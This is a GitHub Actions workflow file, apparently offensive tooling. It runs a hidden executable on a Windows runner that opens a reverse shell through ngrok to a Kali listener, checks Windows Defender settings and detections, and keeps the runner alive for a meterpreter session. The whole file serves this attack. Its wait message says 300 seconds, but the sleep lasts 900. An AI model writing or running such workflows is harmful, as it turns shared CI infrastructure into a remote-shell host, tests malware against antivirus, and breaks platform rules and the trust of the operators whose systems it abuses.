name: Execute Payload on GitHub Actions

on:
  workflow_dispatch:

jobs:
  execute-payload:
    runs-on: windows-latest
    timeout-minutes: 15
    
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      - name: Verify payload exists
        run: |
          dir acheron_*.exe
        shell: pwsh
      
      - name: Check Windows Defender status
        run: |
          Write-Host "=== Windows Defender Status ==="
          Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen, DisableIOAVProtection, DisableScriptScanning
          Write-Host ""
          Write-Host "=== Defender Threats (recent) ==="
          Get-MpThreat | Select-Object ThreatID, Severity, Category, Resources | Format-Table -AutoSize
          Write-Host ""
          Write-Host "=== Defender Quarantine ==="
          Get-MpThreatDetection | Select-Object DetectionTime, ThreatID, ActionSuccess | Format-Table -AutoSize
        shell: pwsh
      
      - name: Execute payload (reverse shell to ngrok)
        run: |
          $exe = Get-ChildItem acheron_*.exe | Select-Object -First 1
          if (-not $exe) {
            Write-Error "EXE non trovato!"
            exit 1
          }
          Write-Host "Executing: $($exe.Name)"
          Start-Process -FilePath $exe.FullName -WindowStyle Hidden
          Write-Host "Payload executed, check Kali listener"
        shell: pwsh
      
      - name: Keep runner alive for session
        run: |
          Write-Host "Waiting 300s for meterpreter session..."
          Start-Sleep -Seconds 900
        shell: pwsh
